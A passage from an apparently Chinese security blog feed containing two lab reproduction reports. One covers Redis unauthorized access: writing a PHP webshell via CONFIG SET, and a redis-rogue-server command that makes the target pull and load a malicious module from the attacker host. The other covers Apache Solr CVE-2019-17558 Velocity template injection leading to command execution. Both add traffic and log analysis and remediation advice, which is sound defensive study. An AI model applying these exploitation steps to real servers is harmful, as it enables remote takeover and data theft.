来衡量，一般可以给到 7 分以上，属于高风险漏洞。</p><p>该漏洞具备利用难度较低，影响范围较广，且危害严重的特点。</p><h3 id="3-3-漏洞详情"><a href="#3-3-漏洞详情" class="headerlink" title="3.3 漏洞详情"></a>3.3 漏洞详情</h3><p>Redis 安装后，若绑定在 0.0.0.0:6379，没有添加防火墙规则等安全策略来避免非信任来源 IP 访问，同时没有设置密码认证或使用弱口令，就会使 Redis 服务暴露在公网上，导致任意能访问目标服务器的用户可未授权访问 Redis，进而读取 Redis 数据。</p><h2 id="四、漏洞存在条件"><a href="#四、漏洞存在条件" class="headerlink" title="四、漏洞存在条件"></a>四、漏洞存在条件</h2><h3 id="网络绑定与暴露方面"><a href="#网络绑定与暴露方面" class="headerlink" title="网络绑定与暴露方面"></a>网络绑定与暴露方面</h3><p>绑定在 0.0.0.0:6379：Redis 默认会绑定在 0.0.0.0:6379 这个地址和端口上，这意味着它可以接受来自任何网络接口的连接请求。如果没有进行额外配置，就为外部访问提供了可能性。</p><p>无防火墙等安全策略：没有添加防火墙规则来限制非信任来源的 IP 访问，或者没有在云服务器安全组等设置中进行访问限制，使得 Redis 服务直接暴露在公网上，外部攻击者可以轻易地访问到 Redis 服务。</p><h3 id="认证设置方面"><a href="#认证设置方面" class="headerlink" title="认证设置方面"></a>认证设置方面</h3><p>未设置密码：没有设置密码认证，即采用默认的无密码状态，或者设置了弱密码，使得攻击者可以无需密码或通过简单猜测就能远程登录到 Redis 服务，直接执行各种命令。</p><h3 id="服务运行权限方面"><a href="#服务运行权限方面" class="headerlink" title="服务运行权限方面"></a>服务运行权限方面</h3><p>以高权限运行：当 Redis 以 root 等具有高权限的用户身份运行时，攻击者利用未授权访问进入后，能够借助高权限进行如写入 SSH 公钥、写入 Webshell、写入计划任务等高危操作，从而进一步控制服务器。</p><h3 id="版本因素方面"><a href="#版本因素方面" class="headerlink" title="版本因素方面"></a>版本因素方面</h3><p>部分版本特性：Redis 2.x、3.x、4.x、5.x 等版本在默认配置下，如果没有进行安全设置，都存在未授权访问的风险。尽管 Redis 3.2 之后增加了 protected-mode，但如果未正确配置或关闭了保护模式，依然可能存在漏洞。</p><h2 id="五、实验工具"><a href="#五、实验工具" class="headerlink" title="五、实验工具"></a>五、实验工具</h2><p>Kali2024攻击机（192.168.144.143）<br>Kali2024靶机（192.168.1144.140）</p><h2 id="六、漏洞复现参考资料"><a href="#六、漏洞复现参考资料" class="headerlink" title="六、漏洞复现参考资料"></a>六、漏洞复现参考资料</h2><p>Secsheep–vulhub漏洞复现之redis 4-unacc 未授权访问漏洞</p><p><a href="http://www.secsheep.top/2023/06/07/vulhub%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0%e4%b9%8bredis-4-unacc-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e/">http://www.secsheep.top/2023/06/07/vulhub漏洞复现之redis-4-unacc-未授权访问漏洞/</a></p><h2 id="七、操作过程"><a href="#七、操作过程" class="headerlink" title="七、操作过程"></a>七、操作过程</h2><h3 id="1-拉取redis复现环境"><a href="#1-拉取redis复现环境" class="headerlink" title="1.拉取redis复现环境"></a>1.拉取redis复现环境</h3><p>在靶机对应的漏洞文件夹下运行docker compose up，观察容器运行信息可知靶场搭建成功</p><p><img src="/img/wps29.jpg" alt="docker容器运行成功"></p><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>运行docker ps查看到靶场开放在6379端口</p><p><img src="/img/wps30.jpg" alt="查看端口信息"></p><p>在攻击机中通过nmap扫描也能查看到靶机的端口开放信息</p><p><img src="/img/wps31.jpg" alt="nmap扫描结果"></p><h3 id="3-用redis-cli命令远程免密登录redis主机"><a href="#3-用redis-cli命令远程免密登录redis主机" class="headerlink" title="3.用redis-cli命令远程免密登录redis主机"></a>3.用redis-cli命令远程免密登录redis主机</h3><p>利用攻击机安装redis-cli远程连接工具</p><p><img src="/img/wps32.jpg" alt="安装redis-cli"></p><p>用redis-cli命令远程免密登录redis主机，并且通过info查看到redis的基本信息</p><p><img src="/img/wps33.jpg" alt="redis免密登录"></p><h3 id="4-写入shell文件"><a href="#4-写入shell文件" class="headerlink" title="4.写入shell文件"></a>4.写入shell文件</h3><p>因为靶场没有开启web端口无法直接上传木马文件，所以用写入shell文件的方式添加后门</p><p>将dir设置为一个目录A，而dbfilename为文件名B，再执行save或bgsave，则我们就可以写入一个路径为&#x2F;A&#x2F;B的任意文件</p><p>在tmp目录下写入一个test.php的木马文件</p><p><img src="/img/wps34.jpg" alt="写入木马文件"></p><p>在靶机中运行发现命令成功写入</p><p><img src="/img/wps35.jpg" alt="命令成功写入"></p><h3 id="5-使用py脚本执行远程命令"><a href="#5-使用py脚本执行远程命令" class="headerlink" title="5.使用py脚本执行远程命令"></a>5.使用py脚本执行远程命令</h3><p>首先把exp进行下载（git clone失败我选择本地下载上传）</p><p><img src="/img/wps36.jpg" alt="下载exp"></p><p>首先执行make命令，如何再回到redis-rogue-getshell目录下，最后执行<br>python3 redis-rogue-server.py –rhost 192.168.144.140 –lhost 192.168.144.143</p><p><img src="/img/wps37.jpg" alt="执行脚本"></p><p>然后输入i进入交互即可，即可连接成功</p><p><img src="/img/wps38.jpg" alt="成功连接"></p><h2 id="八、数据分析"><a href="#八、数据分析" class="headerlink" title="八、数据分析"></a>八、数据分析</h2><h3 id="8-1-流量分析"><a href="#8-1-流量分析" class="headerlink" title="8.1 流量分析"></a>8.1 流量分析</h3><p>在利用攻击机进行攻击时，我打开wireshark抓包，并存储在csv文件中</p><p><img src="/img/wps39.jpg" alt="抓包分析1"></p><p><img src="/img/wps40.jpg" alt="抓包分析2"></p><p><img src="/img/wps41.jpg" alt="抓包分析3"></p><p><strong>通过对每一条数据包的分析，可以发现该攻击方式的流量特征：</strong></p><ol><li>利用RESP协议发送高危Redis命令：CONFIG SET dir：频繁修改数据库存储路径（如&#x2F;tmp、&#x2F;root&#x2F;.ssh）。</li><li>CONFIG SET dbfilename：设置恶意文件名（如test.php、authorized_keys）。</li><li>SLAVEOF：将靶机设置为攻击机的从节点（如SLAVEOF 192.168.144.143 21000），用于数据同步或写入恶意文件。</li><li>MODULE LOAD：加载动态库（如exp.so），尝试执行任意代码。</li><li>写入Webshell与SSH公钥：<ul><li>Webshell：通过set webshell写入PHP代码<?php phpinfo();?>，并保存为test.php（第5、10、19、22行）。</li><li>SSH公钥：尝试将数据库文件设置为authorized_keys（第38行），但因权限不足失败（第29行显示Permission denied）。</li></ul></li><li>恶意模块加载与清理：<ul><li>加载动态库exp.so（第149行），可能用于反弹Shell或提权。</li><li>攻击后删除恶意文件（第156行rm .&#x2F;exp.so），掩盖攻击痕迹。</li></ul></li><li>TCP Keep-Alive保活探测：<ul><li>大量[TCP Keep-Alive]包（如第8、13、25行等），用于维持连接或探测靶机存活状态。</li></ul></li></ol><h3 id="8-2-日志分析"><a href="#8-2-日志分析" class="headerlink" title="8.2 日志分析"></a>8.2 日志分析</h3><p>我在靶机查看了docker的行为日志，并把日志保存在文件log.txt</p><p><img src="/img/wps42.jpg" alt="日志分析"></p><p>Log.txt记录了 Redis 实例的启动、运行及主从同步过程，结合渗透攻击场景，有诸多异常与潜在攻击迹象：</p><p><strong>未授权访问风险暴露</strong></p><p>日志开头显示 “Warning: no config file specified, using the default config.”，这意味着 Redis 使用默认配置启动。默认配置下，Redis 可能未设置密码，且可能绑定在 0.0.0.0:6379，允许任意 IP 访问，为未授权访问创造了条件。攻击者可借此直接连接 Redis 服务，开展后续攻击。</p><p><strong>主从复制异常操作</strong></p><p>日志多次出现 “SLAVE OF 192.168.144.143:21000 enabled”，表明有人尝试将该 Redis 实例设置为指定主节点的从节点。但连接主节点时多次遭遇 “Connection refused” 错误，却持续尝试连接。这种异常的重复连接行为不符合正常运维操作逻辑，极有可能是攻击者在利用主从复制机制实施攻击</p><p>攻击者可能意图通过控制主节点，使目标 Redis 实例（从节点）同步恶意数据，比如植入后门、篡改数据等。此外，在主从同步过程中，出现 “Wrong signature trying to load DB from file” 和 “Failed trying to load the MASTER synchronization DB from disk” 错误，可能是攻击者干扰了同步数据，破坏数据完整性，或借此让 Redis 实例进入不稳定状态，便于后续利用其他漏洞。</p><p><strong>恶意模块加载迹象</strong></p><p>日志中 “Module’system’ loaded from .&#x2F;exp.so” 记录显示，Redis 加载了一个名为 “system” 的非标准模块，且来源可疑（”exp.so” 文件名暗示可能是恶意工具）。正常情况下，Redis 不会加载此类模块。攻击者很可能利用未授权访问漏洞上传并加载该恶意模块，从而获取额外权限，比如在 Redis 进程所在环境中执行系统命令，实现对宿主机的进一步渗透。</p><p><strong>可疑的命令执行记录</strong></p><p>日志中 “MASTER MODE enabled (user request from ‘id&#x3D;5 addr&#x3D;192.168.144.143:56002 fd&#x3D;9 name&#x3D; age&#x3D;5 idle&#x3D;0 flags&#x3D;N db&#x3D;0 sub&#x3D;0 psub&#x3D;0 multi&#x3D;-1 qbuf&#x3D;0 qbuf-free&#x3D;32768 obl&#x3D;0 oll&#x3D;0 omem&#x3D;0 events&#x3D;r cmd&#x3D;slaveof’)” 表明，有人执行了切换到主模式的命令，且来源 IP 为 192.168.144.143:56002。这一操作结合上述异常，很可能是攻击者为达成特定攻击目的（如数据篡改、权限提升等）而实施的操作，进一步证实了 Redis 实例正遭受恶意攻击。</p><h3 id="8-3-漏洞利用行为总结"><a href="#8-3-漏洞利用行为总结" class="headerlink" title="8.3 漏洞利用行为总结"></a>8.3 漏洞利用行为总结</h3><p><strong>针对漏洞利用过程中的流量和服务器日志进行分析，总结漏洞利用过程中的行为特征如下：</strong></p><p><strong>未授权访问与初始连接</strong>：攻击者利用 Redis 未授权访问漏洞，通过 TCP 协议与目标 Redis 服务器（192.168.144.140）建立连接，如unacc.csv中大量 TCP 连接记录，源 IP192.168.144.143不断与目标交互，且早期连接无认证相关信息，表明可随意访问。</p><p><strong>配置篡改行为</strong>：在unacc.csv中多次出现使用config set命令修改 Redis 配置的操作，如修改工作目录（config set dir &#x2F;tmp）和数据库文件名（config set dbfilename test.php等） 。在log.txt虽未直接显示配置修改的相关报错或确认信息，但从整体攻击逻辑看，这些配置修改为后续恶意操作做准备，可能用于指定恶意文件的存储位置或干扰正常数据存储。</p><p><strong>恶意数据注入</strong>：攻击者通过unacc.csv中的set webshell命令向 Redis 数据库注入恶意代码，如<?php phpinfo();?> ，意图在服务器上创建 Webshell，为后续远程控制服务器提供途径。</p><p>主从复制滥用：log.txt中 Redis 实例尝试设置为从节点（SLAVE OF 192.168.144.143:21000），在连接和同步过程中出现多次错误仍持续尝试。unacc.csv也记录了相关SLAVEOF指令，表明攻击者利用主从复制机制，可能试图从恶意主节点同步数据，实现数据窃取或在目标 Redis 实例中植入恶意数据。</p><p><strong>恶意模块加载</strong>：unacc.csv中有MODULE LOAD .&#x2F;exp.so操作，log.txt显示成功加载system模块（从.&#x2F;exp.so） ，攻击者借助未授权访问上传并加载恶意模块，以获取额外权限，如执行系统命令，对服务器安全造成严重威胁。</p><p><strong>攻击的持续性和试探性</strong>：从unacc.csv的时间序列和操作记录来看，攻击行为持续时间长，且在遇到如连接拒绝（log.txt中同步时的连接拒绝错误）等问题时仍不断尝试不同操作。例如，在修改配置、设置数据、加载模块等操作之间，即便出现错误，攻击者依旧持续进行其他攻击尝试，以实现最终控制服务器或窃取数据的目的。</p><h2 id="九、漏洞修复建议"><a href="#九、漏洞修复建议" class="headerlink" title="九、漏洞修复建议"></a>九、漏洞修复建议</h2><ol><li>升级Redis至最新版本，修复未授权访问漏洞。</li><li>启用Redis认证（requirepass）。</li><li>禁止使用root权限启动redis服务。</li><li>设置 Redis 访问密码在 redis.conf 中找到 “requirepass” 字段在后面填上强口令，redis 客户端也需要此密码来访问 redis 服务。</li><li>添加IP访问限制：配置 bind 选项限定可以连接 Reids 服务器的 IP并修改默认端口 6379</li></ol><h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>通过此次漏洞复现，我掌握了vulhub靶场搭建以及远程执行poc代码，并理解了上传webshell的原理，最后通过日志分析和流量分析得出漏洞利用行为的特征，比如注入恶意数据，篡改配置行为。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Redis</tag>
      
      <tag>未授权访问</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>solr 远程命令执行 (CVE-2019-17558)漏洞复现</title>
    <link href="/2025/08/23/solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/08/23/solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="solr-远程命令执行-CVE-2019-17558-漏洞复现"><a href="#solr-远程命令执行-CVE-2019-17558-漏洞复现" class="headerlink" title="solr 远程命令执行 (CVE-2019-17558)漏洞复现"></a>solr 远程命令执行 (CVE-2019-17558)漏洞复现</h1><h2 id="一、报告目的"><a href="#一、报告目的" class="headerlink" title="一、报告目的"></a>一、报告目的</h2><h3 id="1-1-报告对象"><a href="#1-1-报告对象" class="headerlink" title="1.1 报告对象"></a>1.1 报告对象</h3><p>系统安全运维人员：该报告提供了 Apache Solr 中 CVE-2019-17558 漏洞的详细复现过程，可以帮助运维人员理解漏洞的特性，识别系统是否受到影响，并采取相应的安全加固措施。</p><p>渗透测试人员：报告展示了漏洞的利用方法和攻击特征，有助于渗透测试人员了解如何验证目标系统的漏洞是否存在，并模拟攻击进行漏洞评估。</p><p>开发团队：本报告详细分析了漏洞的根源和影响，开发团队可以借此了解如何在未来的开发过程中避免类似的安全问题，提升代码的安全性。</p><p>管理层人员：对于关注公司网络安全、IT架构安全的管理人员，本报告提供了该漏洞可能带来的安全风险评估和危害分析，帮助管理层做出安全决策。</p><h3 id="1-2-报告目的"><a href="#1-2-报告目的" class="headerlink" title="1.2 报告目的"></a>1.2 报告目的</h3><p>本报告的目的在于分析和复现 Apache Solr 中的远程代码执行漏洞（CVE-2019-17558）。报告通过漏洞复现过程展示漏洞存在的风险，提供相应的攻击方式和应对措施，为相关技术人员提供必要的修复建议。</p><h3 id="1-3-报告评价"><a href="#1-3-报告评价" class="headerlink" title="1.3 报告评价"></a>1.3 报告评价</h3><p>读者通过阅读本报告，应该能获得以下评价与收获：</p><p>安全意识提升： 读者将对 CVE-2019-17558 漏洞的性质有清晰的理解，能够认识到即使是看似不起眼的配置错误也可能导致严重的远程代码执行风险，从而提升日常开发和运维过程中的安全意识。</p><p>漏洞识别能力增强： 通过报告中的漏洞复现过程，读者能够掌握如何识别类似的漏洞并采取相应的防护措施，增强渗透测试和漏洞检测的能力。</p><p>实际操作经验： 渗透测试人员和安全运维人员能够通过报告中提供的实际攻击步骤和漏洞利用方法，获得实战操作经验，提升应对实际攻击的能力。</p><p>修复和防御措施指导： 通过具体的修复建议，读者能够在自己的系统中迅速定位问题并采取措施修复漏洞，防止类似漏洞的发生，提升系统的安全性。</p><h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><h3 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h3><ol><li>Apache Solr 是一个开源的搜索平台，广泛用于企业级搜索应用。</li><li>Velocity 模板引擎 是一种用于在应用程序中生成动态内容的工具，Solr 使用它来处理一些请求和响应的渲染。</li><li>通过 Velocity 模板注入，攻击者可以在 Solr 请求中嵌入恶意模板，利用 Solr 系统中的执行环境来运行任意 Java 代码。</li></ol><h3 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h3><ol><li>params.resource.loader.enabled 配置项默认为 false，但它可以被恶意请求修改为 true，这样 Solr 就允许外部加载资源文件。</li><li>通过构造带有恶意 Velocity 模板的请求，攻击者能够绕过系统的安全限制，执行任意的 Java 代码。</li></ol><h3 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h3><ol><li>攻击者首先需要访问 Solr 的某个特定端点，通常是 &#x2F;select 或 &#x2F;update，并且能够在请求中插入任意的查询参数。</li><li>在 CVE-2019-17558 中，攻击者利用 Solr 的 wt&#x3D;velocity（Velocity 渲染模板）参数和恶意的模板参数来构造请求。</li><li>恶意模板注入：攻击者通过构造请求将恶意的 Velocity 模板注入到请求参数中，使得服务器在处理请求时执行这些模板，达到执行任意代码的目的。</li></ol><h2 id="三、漏洞详细情况说明"><a href="#三、漏洞详细情况说明" class="headerlink" title="三、漏洞详细情况说明"></a>三、漏洞详细情况说明</h2><h3 id="3-1-影响范围"><a href="#3-1-影响范围" class="headerlink" title="3.1 影响范围"></a>3.1 影响范围</h3><p><strong>受影响的版本：</strong></p><p>此漏洞影响 Apache Solr 5.0.0 至 8.3.1 版本。只有在使用 Velocity Response Writer 的场景下，且相关配置项（例如 params.resource.loader.enabled 和 solr.resource.loader.enabled）被错误地启用时，漏洞才会被触发。</p><p><strong>配置和部署条件：</strong></p><p>仅在 Velocity 模板引擎被启用，并允许外部资源加载的情况下，攻击者才能利用该漏洞。因此，默认配置下风险较低，但许多用户为了扩展功能或调试时可能会手动修改配置，从而引入安全隐患。</p><p><strong>可能受影响的系统：</strong></p><ul><li>搜索和数据索引系统： 依赖 Apache Solr 进行搜索和数据索引的企业应用。</li><li>企业级搜索解决方案： 部署在企业内部或面向公网的搜索平台。</li><li>Web 应用和大数据平台： 集成 Solr 服务的 Web 应用或大数据处理系统，尤其是那些直接对外开放的服务。</li></ul><p><strong>潜在风险与后果：</strong></p><p>漏洞可导致远程代码执行，使攻击者能够在受影响的服务器上执行任意命令，进而可能获取系统权限。</p><p>如果 Solr 实例部署在公共网络或缺乏有效访问控制，攻击者利用该漏洞可以轻易突破防御，造成数据泄露、服务中断或系统完全失控。</p><h3 id="3-2-评分"><a href="#3-2-评分" class="headerlink" title="3.2 评分"></a>3.2 评分</h3><p>CVE-2019-17558 漏洞的 CVSS v3.0 评分为 8.8，属于高风险漏洞，建议尽快修复该漏洞，特别是系统暴露在公共网络上时。</p><h3 id="3-3-漏洞详情"><a href="#3-3-漏洞详情" class="headerlink" title="3.3 漏洞详情"></a>3.3 漏洞详情</h3><p>CVE-2019-17558 是一个影响 Apache Solr 的远程代码执行漏洞，存在于 Velocity 模板引擎的配置中。攻击者通过构造恶意请求，利用未正确禁用的外部资源加载器，注入 Velocity 模板并执行任意 Java 代码。此漏洞影响 Apache Solr 版本 5.0.0 至 8.3.1，允许攻击者远程执行命令、获取敏感信息或完全控制受影响系统。修复方法是升级 Solr 至 8.4.0 及更高版本，并禁用外部资源加载器。</p><h2 id="四、漏洞存在条件"><a href="#四、漏洞存在条件" class="headerlink" title="四、漏洞存在条件"></a>四、漏洞存在条件</h2><p>Velocity 模板引擎启用：Solr 必须启用 Velocity 模板引擎来处理请求，特别是 wt&#x3D;velocity（Velocity 响应类型）配置项被使用时。</p><p>外部资源加载器未禁用：Solr 配置中的 params.resource.loader.enabled 或 solr.resource.loader.enabled 设置为 true，允许加载外部资源文件。这使得攻击者能够通过构造恶意请求，加载并执行未经授权的 Velocity 模板。</p><p>使用的 Solr 版本：漏洞存在于 Apache Solr 版本 5.0.0 至 8.3.1 中。没有及时升级的系统容易受到该漏洞的影响。</p><h2 id="五、实验工具"><a href="#五、实验工具" class="headerlink" title="五、实验工具"></a>五、实验工具</h2><p>Windows攻击机（192.168.144.138）<br>Kali2024靶机（192.168.1144.140）</p><h2 id="六、漏洞复现参考资料"><a href="#六、漏洞复现参考资料" class="headerlink" title="六、漏洞复现参考资料"></a>六、漏洞复现参考资料</h2><p><a href="https://blog.csdn.net/YouthBelief/article/details/121083848?spm=1001.2101.3001.6650.12&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-12-121083848-blog-143815528.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1">https://blog.csdn.net/YouthBelief/article/details/121083848?spm=1001.2101.3001.6650.12&amp;utm_medium&#x3D;distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-12-121083848-blog-143815528.235%5Ev43%5Epc_blog_bottom_relevance_base3&amp;depth_1</a></p><h2 id="七、操作过程"><a href="#七、操作过程" class="headerlink" title="七、操作过程"></a>七、操作过程</h2><h3 id="1-拉取CVE-2019-17558复现环境"><a href="#1-拉取CVE-2019-17558复现环境" class="headerlink" title="1.拉取CVE-2019-17558复现环境"></a>1.拉取CVE-2019-17558复现环境</h3><p>在靶机对应的漏洞文件夹下运行docker compose up</p><p><img src="/img/wps1-1755936631060-1.jpg" alt="运行docker compose up"></p><p>运行docker ps可查看容器运行情况</p><p><img src="/img/wps2-1755936631061-2.jpg" alt="查看容器状态"></p><p>由图可知，容器成功运行在本机8983端口</p><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>在攻击机中利用fscan 运行命令：fscan.exe -h 192.168.144.140</p><p><img src="/img/wps3-1755936631061-4.jpg" alt="fscan扫描结果"></p><p>发现靶机的开放了两个端口分别是8983和8834</p><p>接着用nmap扫描开放的端口的对应服务</p><p><img src="/img/wps4-1755936631061-3.jpg" alt="nmap扫描结果"></p><p>发现8983端口的对应服务为apache solr,即可确定渗透注入点</p><p>用dirsearch运行命令： dirsearch -u <a href="http://192.168.144.140:8983，进行目录探测">http://192.168.144.140:8983，进行目录探测</a></p><p><img src="/img/wps5-1755936631061-7.jpg" alt="目录探测结果"></p><p>在浏览器中进行访问，并没有发现明显漏洞注入点</p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p>默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。可以先通过如下API获取所有的核心</p><p>在vulhub中核心就是demo</p><p>通过下边API获取所有内核名称</p><p><a href="http://118.193.36.37:8468/solr/admin/cores?indexInfo=false&wt=json">http://118.193.36.37:8468/solr/admin/cores?indexInfo=false&amp;wt=json</a></p><p><img src="/img/wps6-1755936631061-5.jpg" alt="获取核心名称"></p><p>在url访问&#x2F;solr&#x2F;demo&#x2F;config</p><p><img src="/img/wps7-1755936631061-6.jpg" alt="访问配置"></p><p>发现状态码为400，即访问失败</p><p>启用配置 params.resource.loader.enabled 为true，在url访问&#x2F;solr&#x2F;demo&#x2F;config，burpsuit抓包</p><p><img src="/img/wps8-1755936631061-8.jpg" alt="burpsuit抓包"></p><p>改成POST然后修改启动配置，修改请求体</p><p><img src="/img/wps9-1755936631061-9.jpg" alt="修改请求"></p><p>最后发现页面成功回显</p><p><img src="/img/wps10-1755936631061-10.jpg" alt="成功回显"></p><p>成功将启用配置 params.resource.loader.enabled 为true</p><p>利用hackbar插件注入 Velocity 模板即可执行任意命令</p><p><img src="/img/wps11-1755936631061-11.jpg" alt="执行命令"></p><p>最终成功执行ls命令，得到所有隐私目录</p><h2 id="八、数据分析"><a href="#八、数据分析" class="headerlink" title="八、数据分析"></a>八、数据分析</h2><h3 id="8-1-流量分析"><a href="#8-1-流量分析" class="headerlink" title="8.1 流量分析"></a>8.1 流量分析</h3><p>在利用攻击机进行攻击时，我打开wireshark抓包，并存储在csv文件中</p><p><img src="/img/wps12-1755936631061-12.jpg" alt="抓包数据1"></p><p><img src="/img/wps13-1755936631061-13.jpg" alt="抓包数据2"></p><p><strong>通过对每一条数据包的分析，可以发现该攻击方式的流量特征：</strong></p><ol><li>目标端口固定</li></ol><p>流量主要集中在源端口 50373、50376 与目的端口 8983 之间的通信，8983 端口通常是 Solr 服务的默认端口，这表明攻击者的目标明确指向 Solr 服务。</p><ol start="2"><li>攻击请求特征</li></ol><p>多次出现包含恶意参数的 HTTP GET 请求，请求路径为 &#x2F;solr&#x2F;demo&#x2F;select，且带有 wt&#x3D;velocity 和 v.template&#x3D;custom 参数，这是利用 Solr 的 Velocity 模板注入漏洞（CVE - 2019 - 17558）的典型特征。请求中还包含通过反射调用 java.lang.Runtime 类并执行系统命令（如 ls）的代码</p><ol start="3"><li>请求频率较高</li></ol><p>在短时间内（如 1.055052 秒和 1.518454 秒）出现多次相同的攻击请求，这可能是攻击者在尝试不同的命令或者确认攻击是否成功，体现了攻击者试图利用漏洞的急切性</p><ol start="4"><li>响应状态正常</li></ol><p>针对攻击请求，服务器返回了 HTTP&#x2F;1.1 200 OK 的响应，说明服务器正常处理了请求，但这并不意味着攻击未成功，有可能攻击代码已经在服务器端执行。</p><ol start="5"><li>存在 TCP Keep - Alive 机制</li></ol><p>在攻击过程中，存在大量的 TCP Keep - Alive 数据包，用于维持连接的有效性，这有助于攻击者在较长时间内持续进行攻击或者获取攻击结果。例如：</p><h3 id="8-2-日志分析"><a href="#8-2-日志分析" class="headerlink" title="8.2 日志分析"></a>8.2 日志分析</h3><p>我在靶机查看了docker的行为日志，并把日志保存在文件log.txt</p><p><img src="/img/wps14-1755936631061-14.jpg" alt="日志分析"></p><p><strong>日志特征</strong></p><p><strong>1.Velocity 模板注入痕迹</strong></p><p>ERROR [qtp1947426831-24] o.a.s.s.SolrDispatchFilter handleException] org.apache.velocity.exception.MethodInvocationException: Invocation of method ‘exec’ in class ‘java.lang.Runtime’ failed</p><p>分析：攻击 Payload 通过v.template&#x3D;custom参数注入 Velocity 代码，若执行失败（如命令语法错误），Solr 会记录 Velocity 引擎抛出的异常。</p><p><strong>2.反射调用异常</strong></p><p>Caused by: java.lang.NoSuchMethodException: java.lang.Runtime.exec([Ljava.lang.String;)java.lang.Process</p><p>分析：攻击 Payload 通过反射调用java.lang.Runtime.exec执行命令，若参数格式错误（如缺少数组括号），会触发NoSuchMethodException。</p><p><strong>3.命令执行失败记录</strong></p><p>java.io.IOException: Cannot run program “ls”: error&#x3D;2, No such file or directory</p><p>分析：若攻击尝试执行不存在的命令（如ls拼写错误），会触发IOException。</p><p><strong>4.高频率异常请求</strong></p><p>WARN  [qtp1947426831-24] o.a.s.s.SolrDispatchFilter handleException] org.apache.solr.common.SolrException: org.apache.velocity.exception.ParseErrorException: Encountered “ <VARIABLE> “v.template” “ at line 1, column 10.</p><p>分析：攻击尝试多次发送含错误参数的请求，导致 Solr 记录高频异常。</p><h3 id="8-3-漏洞利用行为总结"><a href="#8-3-漏洞利用行为总结" class="headerlink" title="8.3 漏洞利用行为总结"></a>8.3 漏洞利用行为总结</h3><p><strong>针对漏洞利用过程中的流量和服务器日志进行发现，总结漏洞利用过程中行为特征如下：</strong></p><p><strong>1.目标探测与配置确认</strong></p><p>攻击者首先探测目标 Apache Solr 实例是否启用了 Velocity 模板响应功能，并确认是否存在错误配置（例如允许外部资源加载器）。</p><p><strong>2.构造恶意请求</strong></p><p>利用已知漏洞，攻击者构造包含恶意 Velocity 模板代码的 HTTP 请求，该请求中通常包含参数 wt&#x3D;velocity 和 v.template.custom。通过这些参数，攻击者将恶意代码注入到模板中。</p><p><strong>3.远程代码执行</strong></p><p>当 Solr 服务器处理该请求时，Velocity 模板引擎解析并执行注入的恶意代码，从而实现任意 Java 代码的执行。此步骤使攻击者能够执行系统命令、读取敏感信息或完全接管服务器。</p><p><strong>4.后续利用</strong></p><p>成功利用漏洞后，攻击者可以进一步渗透系统，获取更多权限，甚至在服务器上部署后门，实现长时间的控制和数据窃取。</p><h2 id="九、漏洞修复建议"><a href="#九、漏洞修复建议" class="headerlink" title="九、漏洞修复建议"></a>九、漏洞修复建议</h2><h3 id="1-升级-Apache-Solr-版本："><a href="#1-升级-Apache-Solr-版本：" class="headerlink" title="1.升级 Apache Solr 版本："></a>1.升级 Apache Solr 版本：</h3><p>最直接的修复方式是升级到 Apache Solr 8.4.0 或更高版本，因为这些版本已修复该漏洞，并加强了 Velocity 模板引擎的配置，阻止了外部资源加载和模板注入。</p><h3 id="2-禁用-Velocity-模板功能："><a href="#2-禁用-Velocity-模板功能：" class="headerlink" title="2.禁用 Velocity 模板功能："></a>2.禁用 Velocity 模板功能：</h3><p>如果不需要使用 Velocity 模板引擎，最好禁用相关功能，防止潜在的利用风险。可以通过修改 solrconfig.xml 文件，确保 wt&#x3D;velocity 参数不被启用。</p><h3 id="3-配置限制和访问控制："><a href="#3-配置限制和访问控制：" class="headerlink" title="3.配置限制和访问控制："></a>3.配置限制和访问控制：</h3><p>限制访问：通过防火墙或访问控制列表（ACL）限制对 Solr 服务的访问，仅允许可信的内部或外部 IP 访问。避免公开暴露 Solr 服务，特别是在互联网环境中。</p><p>应用访问控制：确保只有授权的用户可以执行特定操作，防止未经授权的用户访问敏感功能。</p><h3 id="4-安全配置审查："><a href="#4-安全配置审查：" class="headerlink" title="4.安全配置审查："></a>4.安全配置审查：</h3><p>定期检查 Solr 配置，确保所有安全选项已启用，并且没有过时的默认配置（如开启 Velocity 模板引擎）。</p><p>确保服务器的操作系统和 Java 环境也保持最新，以减少其他潜在的安全漏洞。</p><h3 id="5-监控和日志审计："><a href="#5-监控和日志审计：" class="headerlink" title="5.监控和日志审计："></a>5.监控和日志审计：</h3><p>开启日志记录功能，确保可以跟踪所有的请求和响应，特别是 HTTP 请求中包含 wt&#x3D;velocity 或其他可疑参数时。</p><p>使用监控工具检测异常行为，及时识别并响应可能的攻击。</p><h3 id="6-补丁管理和安全扫描："><a href="#6-补丁管理和安全扫描：" class="headerlink" 